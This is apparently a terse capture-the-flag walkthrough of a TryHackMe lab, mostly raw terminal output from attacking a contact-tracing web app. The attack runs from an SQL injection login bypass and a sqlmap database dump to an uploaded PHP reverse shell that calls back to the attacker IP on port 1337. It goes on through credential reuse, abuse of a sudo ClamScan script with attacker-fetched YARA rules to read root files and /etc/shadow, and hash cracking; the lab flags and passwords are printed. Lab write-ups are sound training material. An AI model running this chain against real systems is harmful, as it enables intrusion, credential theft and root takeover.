----
Stay at 127.0.0.1. Wear a 255.255.255.0.
----

![](https://i.imgur.com/yGq1mtN.jpg)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/a3449d5ba8c69c8a0d03c27023bb1852.png)
### Task 1  Flags

 Start Machine

Deploy the machine attached to this task and find the flags.

Banner © pngtree.com.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.142.79 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.142.79:22
Open 10.10.142.79:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 22:44 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:45
Completed NSE at 22:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:45
Completed NSE at 22:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:45
Completed NSE at 22:45, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:45
Completed Parallel DNS resolution of 1 host. at 22:45, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:45
Scanning 10.10.142.79 [2 ports]
Discovered open port 80/tcp on 10.10.142.79
Discovered open port 22/tcp on 10.10.142.79
Completed Connect Scan at 22:45, 0.19s elapsed (2 total ports)
Initiating Service scan at 22:45
Scanning 2 services on 10.10.142.79
Completed Service scan at 22:45, 6.49s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.142.79.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:45
Completed NSE at 22:45, 6.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:45
Completed NSE at 22:45, 0.82s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:45
Completed NSE at 22:45, 0.00s elapsed
Nmap scan report for 10.10.142.79
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-04 22:45:03 EDT for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 271dc58a0bbc02c0f0f1f55ad1ffa463 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA1Xdw3dCrCjetmQieza7pYcBp1ceBvVB6g1A/OU+bqoRSEfnKTHP0k5P2U1BbeciJTqflslP3IHh+py4jkWTkzbU80Mxokn2Kr5Qa5GKgrme4Q6GfQsQeeFpbLlIHs+eEBnCLY/J03iddkt6eukd3VwZuRXHnEHl7G6Y1f0IEEzProg15iAtUTbS8OwPx+ZwdvXfJTWujUS+OzLLjQw5wPewCEK+TJHVM02H+5sO+dYBMC9rgiEnPe5ayP+nupAXMNYB9/p/gO3nj5h33SokY3RkXMFsijUJpoBnsDHNgo2Q41j9AB4txabzUQVFql30WO8l8azO4y/fWYYtU8YCn
|   256 cef76029524f65b120020a2d0740fdbf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGjTYytQsU83icaN6V9H1Kotl0nKVpR35o6PtyrWy9WjljhWaNr3cnGDUnd7RSIUOiZco3UL5+YC31sBdVy6b6o=
|   256 a5b55a4013b00fb65a5f2160716f452e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHVz0M8zYIXcw2caiAlNCr01ycEatz/QPx1PpgMZqZN
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Coronavirus Contact Tracer
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:45
Completed NSE at 22:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:45
Completed NSE at 22:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:45
Completed NSE at 22:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts                         
10.10.142.79 contacttracer.thm 

http://contacttracer.thm/admin/login.php

' or 1=1 # sqli

https://www.exploit-db.com/exploits/49604

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php                  
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>     

upload then logout 

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://contacttracer.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://contacttracer.thm/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/04 23:04:59 Starting gobuster in directory enumeration mode
===============================================================
http://contacttracer.thm/uploads              (Status: 301) [Size: 324] [--> http://contacttracer.thm/uploads/]
http://contacttracer.thm/admin                (Status: 301) [Size: 322] [--> http://contacttracer.thm/admin/]
http://contacttracer.thm/plugins              (Status: 301) [Size: 324] [--> http://contacttracer.thm/plugins/]

change pass admin

┌──(witty㉿kali)-[~/Downloads]
└─$ cat req_covid.txt 
GET /admin/?page=reports&eid=all&date=2023-07-05 HTTP/1.1
Host: contacttracer.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://contacttracer.thm/admin/?page=reports
Cookie: PHPSESSID=1aj9i4o2ka9uecaufbqj6gu7mu
Upgrade-Insecure-Requests: 1


┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -r req_covid.txt --dump -p date
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:16:28 /2023-07-04/

[23:16:28] [INFO] parsing HTTP request from 'req_covid.txt'
[23:16:28] [INFO] testing connection to the target URL
[23:16:29] [INFO] testing if the target URL content is stable
[23:16:30] [INFO] target URL content is stable
[23:16:30] [WARNING] heuristic (basic) test shows that GET parameter 'date' might not be injectable
[23:16:31] [INFO] testing for SQL injection on GET parameter 'date'
[23:16:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:16:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:16:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:16:36] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[23:16:37] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[23:16:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[23:16:40] [INFO] testing 'Generic inline queries'
[23:16:40] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[23:16:41] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[23:16:42] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[23:16:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:16:54] [INFO] GET parameter 'date' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[23:17:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:17:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[23:17:07] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[23:17:08] [INFO] target URL appears to have 8 columns in query
[23:17:09] [INFO] GET parameter 'date' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'date' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
---
Parameter: date (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=reports&eid=all&date=2023-07-05' AND (SELECT 5281 FROM (SELECT(SLEEP(5)))BfhR) AND 'ecvz'='ecvz

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: page=reports&eid=all&date=2023-07-05' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x494242626e4257555a6c54776b4b786855456658785369467345774c52696c794f43775546576856,0x716a787a71),NULL-- -
---
[23:17:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[23:17:20] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[23:17:20] [INFO] fetching current database
[23:17:20] [INFO] fetching tables for database: 'cts_db'
[23:17:20] [INFO] fetching columns for table 'users' in database 'cts_db'
[23:17:21] [INFO] fetching entries for table 'users' in database 'cts_db'
Database: cts_db
Table: users
[1 entry]
+----+-------------------------------------+----------+----------+----------+--------------+---------------------+--------------+---------------------+
| id | avatar                              | lastname | password | username | firstname    | date_added          | last_login   | date_updated        |
+----+-------------------------------------+----------+----------+----------+--------------+---------------------+--------------+---------------------+
| 1  | uploads/1688526480_payload_ivan.php | admin    | admin    | <blank>  | Adminstrator | 2021-01-20 14:02:37 |  EsvijkAdmin | 2023-07-05 03:08:27 |
+----+-------------------------------------+----------+----------+----------+--------------+---------------------+--------------+---------------------+

[23:17:21] [INFO] table 'cts_db.users' dumped to CSV file '/home/witty/.local/share/sqlmap/output/contacttracer.thm/dump/cts_db/users.csv'
[23:17:21] [INFO] fetching columns for table 'establishment' in database 'cts_db'
[23:17:22] [INFO] fetching entries for table 'establishment' in database 'cts_db'
Database: cts_db
Table: establishment
[1 entry]
+----+---------+---------+-------------------+-------------+----------------+---------------------------------------------------------------------------------------+
| id | city_id | zone_id | code              | name        | address        | image_path                                                                            |
+----+---------+---------+-------------------+-------------+----------------+---------------------------------------------------------------------------------------+
| 1  | 3       | 1       | 01032386416334554 | Sample Mall | Sample Address | uploads/1614299580_47446233-clean-noir-et-gradient-sombre-image-de-fond-abstrait-.jpg |
+----+---------+---------+-------------------+-------------+----------------+---------------------------------------------------------------------------------------+

[23:17:22] [INFO] table 'cts_db.establishment' dumped to CSV file '/home/witty/.local/share/sqlmap/output/contacttracer.thm/dump/cts_db/establishment.csv'
[23:17:22] [INFO] fetching columns for table 'barangay_list' in database 'cts_db'
[23:17:23] [INFO] fetching entries for table 'barangay_list' in database 'cts_db'
Database: cts_db
Table: barangay_list
[1 entry]
+----+---------+------+----------+-------------+
| id | city_id | code | name     | description |
+----+---------+------+----------+-------------+
| 1  | 3       | 23   | Mambulac | Sample      |
+----+---------+------+----------+-------------+

[23:17:23] [INFO] table 'cts_db.barangay_list' dumped to CSV file '/home/witty/.local/share/sqlmap/output/contacttracer.thm/dump/cts_db/barangay_list.csv'
[23:17:23] [INFO] fetching columns for table 'city_list' in database 'cts_db'
[23:17:24] [INFO] fetching entries for table 'city_list' in database 'cts_db'
Database: cts_db
Table: city_list
[4 entries]
+----+----------+------+---------+-------------+
| id | state_id | code | name    | description |
+----+----------+------+---------+-------------+
| 1  | 4        | 01   | Bacolod | 6100        |
| 2  | 4        | 02   | Talisay | 6115        |
| 3  | 4        | 03   | Silay   | 6116        |
| 5  | 1        | 07   | Iloilo  | 12345       |
+----+----------+------+---------+-------------+

[23:17:25] [INFO] table 'cts_db.city_list' dumped to CSV file '/home/witty/.local/share/sqlmap/output/contacttracer.thm/dump/cts_db/city_list.csv'
[23:17:25] [INFO] fetching columns for table 'system_info' in database 'cts_db'
[23:17:25] [INFO] fetching entries for table 'system_info' in database 'cts_db'
Database: cts_db
Table: system_info
[7 entries]
+----+------------+---------------------------------------------------------------------------------------+
| id | meta_field | meta_value                                                                            |
+----+------------+---------------------------------------------------------------------------------------+
| 1  | name       | Coronavirus Contact Tracer                                                            |
| 2  | address    | Philippines                                                                           |
| 3  | contact    | +1234567890                                                                           |
| 4  | email      | info@contacttracer.thm                                                                |
| 5  | fb_page    | https://www.facebook.com/myPageName                                                   |
| 6  | short_name | CTS-QR                                                                                |
| 9  | logo       | uploads/1614224160_47446233-clean-noir-et-gradient-sombre-image-de-fond-abstrait-.jpg |
+----+------------+---------------------------------------------------------------------------------------+

[23:17:25] [INFO] table 'cts_db.system_info' dumped to CSV file '/home/witty/.local/share/sqlmap/output/contacttracer.thm/dump/cts_db/system_info.csv'
[23:17:25] [INFO] fetching columns for table 'people' in database 'cts_db'
[23:17:26] [INFO] fetching entries for table 'people' in database 'cts_db'
Database: cts_db
Table: people
[1 entry]
+----+---------+---------+------------------+----------------------+----------------+-------------+----------+-----------+-------------------------------------+------------+
| id | city_id | zone_id | code             | email                | address        | contact     | lastname | firstname | image_path                          | middlename |
+----+---------+---------+------------------+----------------------+----------------+-------------+----------+-----------+-------------------------------------+------------+
| 2  | 3       | 1       | 0103236915284361 | mwilliams@sample.com | Sample Address | 09125265498 | Williams | Mike      | uploads/1688525820_payload_ivan.php | D          |
+----+---------+---------+------------------+----------------------+----------------+-------------+----------+-----------+-------------------------------------+------------+

[23:17:26] [INFO] table 'cts_db.people' dumped to CSV file '/home/witty/.local/share/sqlmap/output/contacttracer.thm/dump/cts_db/people.csv'
[23:17:26] [INFO] fetching columns for table 'tracks' in database 'cts_db'
[23:17:27] [INFO] fetching entries for table 'tracks' in database 'cts_db'
Database: cts_db
Table: tracks
[12 entries]
+----+-----------+------------------+---------------------+
| id | person_id | establishment_id | date_added          |
+----+-----------+------------------+---------------------+
| 1  | 2         | 1                | 2021-02-26 11:21:15 |
| 2  | 2         | 1                | 2021-02-26 11:22:17 |
| 3  | 2         | 1                | 2021-02-26 11:24:43 |
| 4  | 2         | 1                | 2021-02-26 11:25:03 |
| 5  | 2         | 1                | 2021-02-26 11:26:41 |
| 6  | 2         | 1                | 2021-02-26 11:30:36 |
| 7  | 2         | 1                | 2021-02-26 11:32:17 |
| 8  | 2         | 1                | 2021-02-26 11:32:56 |
| 9  | 2         | 1                | 2021-02-26 11:37:09 |
| 10 | 2         | 1                | 2021-02-26 13:42:16 |
| 11 | 2         | 1                | 2021-02-26 13:42:49 |
| 12 | 2         | 1                | 2021-02-26 13:44:48 |
+----+-----------+------------------+---------------------+

[23:17:27] [INFO] table 'cts_db.tracks' dumped to CSV file '/home/witty/.local/share/sqlmap/output/contacttracer.thm/dump/cts_db/tracks.csv'
[23:17:27] [INFO] fetching columns for table 'state_list' in database 'cts_db'
[23:17:28] [INFO] fetching entries for table 'state_list' in database 'cts_db'
Database: cts_db
Table: state_list
[2 entries]
+----+------+-------------------+-------------+
| id | code | name              | description |
+----+------+-------------------+-------------+
| 1  | 06   | Iloilo            | Region 6    |
| 4  | 01   | Negros Occidental | Region 6    |
+----+------+-------------------+-------------+

[23:17:28] [INFO] table 'cts_db.state_list' dumped to CSV file '/home/witty/.local/share/sqlmap/output/contacttracer.thm/dump/cts_db/state_list.csv'
[23:17:28] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/contacttracer.thm'

[*] ending @ 23:17:28 /2023-07-04/

http://contacttracer.thm/admin/?page=system_info
or update system logo (go to options)

and go to http://contacttracer.thm/login.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.142.79] 54938
SOCKET: Shell has connected! PID: 1928
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@lockdown:/var/www/html/uploads$ 

or going to

http://contacttracer.thm/uploads/1688526480_payload_ivan.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.142.79] 54940
SOCKET: Shell has connected! PID: 1935
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@lockdown:/var/www/html/uploads$ cd /home
cd /home
www-data@lockdown:/home$ ls
ls
cyrus  maxine
www-data@lockdown:/home$ cd cyrus
cd cyrus
bash: cd: cyrus: Permission denied
www-data@lockdown:/home$ cd maxine
cd maxine
bash: cd: maxine: Permission denied
www-data@lockdown:/home$ cd /var/www/html
cd /var/www/html
www-data@lockdown:/var/www/html$ ls
ls
404.html   build       cts_qr_card.png	inc	   login.php  uploads
README.md  classes     dist		index.php  plugins
admin	   config.php  home.php		libs	   temp
www-data@lockdown:/var/www/html$ cd classes
cd classes
www-data@lockdown:/var/www/html/classes$ ls
ls
City.php	   Login.php   State.php	   Users.php
DBConnection.php   Main.php    SystemSettings.php  Zone.php
Establishment.php  People.php  TEST.php
www-data@lockdown:/var/www/html/classes$ cat DBConnection.php
cat DBConnection.php
<?php
class DBConnection{

    private $host = 'localhost';
    private $username = 'cts';
    private $password = 'YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE';
    private $database = 'cts_db';
    
    public $conn;
    
    public function __construct(){

        if (!isset($this->conn)) {
            
            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);
            
            if (!$this->conn) {
                echo 'Cannot connect to database server';
                exit;
            }            
        }    
        
    }
    public function __destruct(){
        $this->conn->close();
    }
}

?>www-data@lockdown:/var/www/html/classes$ mysql -u cts -p
mysql -u cts -p
Enter password: YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2396
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
show tables;
ERROR 1046 (3D000): No database selected
mysql> sshow databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cts_db             |
+--------------------+
2 rows in set (0.00 sec)

mysql> use cts_db;
use cts_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+------------------+
| Tables_in_cts_db |
+------------------+
| barangay_list    |
| city_list        |
| establishment    |
| people           |
| state_list       |
| system_info      |
| tracks           |
| users            |
+------------------+
8 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+--------------+----------+----------+----------+-------------------------------------+------------+---------------------+---------------------+
| id | firstname    | lastname | username | password | avatar                              | last_login | date_added          | date_updated        |
+----+--------------+----------+----------+----------+-------------------------------------+------------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | admin    | uploads/1688526480_payload_ivan.php | NULL       | 2021-01-20 14:02:37 | 2023-07-05 03:08:27 |
+----+--------------+----------+----------+----------+-------------------------------------+------------+---------------------+---------------------+
1 row in set (0.00 sec)


asshh is cz i changed the pass of admin

mysql> select * from users;
select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                        | last_login | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | 3eba6f73c19818c36ba8fea761a3ce6d | uploads/1614302940_avatar.jpg | NULL       | 2021-01-20 14:02:37 | 2021-02-26 10:23:23 |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
1 row in set (0.00 sec)

sweetpandemonium

www-data@lockdown:/var/www/html/classes$ su cyrus
su cyrus
Password: sweetpandemonium

cyrus@lockdown:/var/www/html/classes$ cd /home
cd /home
cyrus@lockdown:/home$ ls
ls
cyrus  maxine
cyrus@lockdown:/home$ cd cyrus
cd cyrus
cyrus@lockdown:~$ ls
ls
quarantine  testvirus  user.txt
cyrus@lockdown:~$ cat user.txt
cat user.txt
THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}

cyrus@lockdown:~$ sudo -l
sudo -l
[sudo] password for cyrus: sweetpandemonium

Matching Defaults entries for cyrus on lockdown:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cyrus may run the following commands on lockdown:
    (root) /opt/scan/scan.sh
cyrus@lockdown:~$ cat /opt/scan/scan.sh
cat /opt/scan/scan.sh
#!/bin/bash

read -p "Enter path: " TARGET

if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi

cyrus@lockdown:~$ sudo /opt/scan/scan.sh
sudo /opt/scan/scan.sh
Enter path: /root
/root
/root/.bashrc: OK
/root/root.txt: OK
/root/.profile: OK

----------- SCAN SUMMARY -----------
Known viruses: 1
Engine version: 0.103.2
Scanned directories: 1
Scanned files: 3
Infected files: 0
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.640 sec (0 m 0 s)
Start Date: 2023:07:05 23:22:48
End Date:   2023:07:05 23:22:49

cyrus@lockdown:~$ ls /var/lib/clamav
ls /var/lib/clamav
main.hdb  mirrors.dat
┌──(witty㉿kali)-[~/Downloads]
└─$ cat root.yar 
rule CheckFileName
{
  strings:
    $a = "root"
    $b = "THM"
    
  condition:
    $a or $b
}

cyrus@lockdown:/var/lib/clamav$ curl http://10.8.19.103:8080/root.yar -o root.yar
<$ curl http://10.8.19.103:8080/root.yar -o root.yar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    96  100    96    0     0    202      0 --:--:-- --:--:-- --:--:--   202
cyrus@lockdown:/var/lib/clamav$ cat root.yar
cat root.yar
rule CheckFileName
{
  strings:
    $a = "root"
    $b = "THM"
    
  condition:
    $a or $b
}
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.152.170 - - [05/Jul/2023 19:27:09] "GET /root.yar HTTP/1.1" 200 -

cyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh
sudo /opt/scan/scan.sh
Enter path: /root
/root
/root/.bashrc: YARA.CheckFileName.UNOFFICIAL FOUND
/root/.bashrc: copied to '/home/cyrus/quarantine/.bashrc'
/root/root.txt: YARA.CheckFileName.UNOFFICIAL FOUND
/root/root.txt: copied to '/home/cyrus/quarantine/root.txt'
/root/.profile: OK

----------- SCAN SUMMARY -----------
Known viruses: 2
Engine version: 0.103.2
Scanned directories: 1
Scanned files: 3
Infected files: 2
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.637 sec (0 m 0 s)
Start Date: 2023:07:05 23:27:47
End Date:   2023:07:05 23:27:47
cyrus@lockdown:/var/lib/clamav$ cat /home/cyrus/quarantine/root.txt
cat /home/cyrus/quarantine/root.txt
THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}

┌──(witty㉿kali)-[~/Downloads]
└─$ cat shadow.yar 
rule root
{
 strings:
  $s = "cyrus" nocase
 condition:
  $s
}

cyrus@lockdown:/var/lib/clamav$ curl http://10.8.19.103:8080/shadow.yar -o shadow.yar
<rl http://10.8.19.103:8080/shadow.yar -o shadow.yar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    63  100    63    0     0    132      0 --:--:-- --:--:-- --:--:--   132
cyrus@lockdown:/var/lib/clamav$ cat shadow.yar
cat shadow.yar
rule root
{
 strings:
  $s = "cyrus" nocase
 condition:
  $s
}

cyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh
sudo /opt/scan/scan.sh
Enter path: /etc/shadow
/etc/shadow
/etc/shadow: YARA.CheckFileName.UNOFFICIAL FOUND
/etc/shadow: copied to '/home/cyrus/quarantine/shadow'

----------- SCAN SUMMARY -----------
Known viruses: 3
Engine version: 0.103.2
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.320 sec (0 m 0 s)
Start Date: 2023:07:05 23:30:46
End Date:   2023:07:05 23:30:47

cyrus@lockdown:/var/lib/clamav$ cat /home/cyrus/quarantine/shadow
cat /home/cyrus/quarantine/shadow
root:*:18480:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18757:0:99999:7:::
maxine:$6$/syu6s6/$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320:18838:0:99999:7:::
cyrus:$6$YWzR.V19JxyENT/D$KuSzWbb6V0iXfIcA/88Buum92Fr5lBu6r.kMoQYAdfvbJuHjO7i7wodoahlZAYfFhIuymOaEWxGlo0WkhbqaI1:18757:0:99999:7:::
mysql:!:18758:0:99999:7:::
clamav:!:18758:0:99999:7:::

┌──(witty㉿kali)-[~/Downloads]
└─$ echo '$6$/syu6s6/$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320' > maxine_hash
                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt maxine_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tiarna           (?)     
1g 0:00:01:05 DONE (2023-07-05 19:33) 0.01530g/s 1237p/s 1237c/s 1237C/s vivita..skyline123
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

cyrus@lockdown:/var/lib/clamav$ su maxine
su maxine
Password: tiarna

maxine@lockdown:/var/lib/clamav$ sudo -l
sudo -l
[sudo] password for maxine: tiarna

Matching Defaults entries for maxine on lockdown:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User maxine may run the following commands on lockdown:
    (ALL : ALL) ALL
maxine@lockdown:/var/lib/clamav$ sudo su
sudo su
root@lockdown:/var/lib/clamav# cd /root
cd /root
root@lockdown:~# l
l
root.txt
root@lockdown:~# cat root.txt
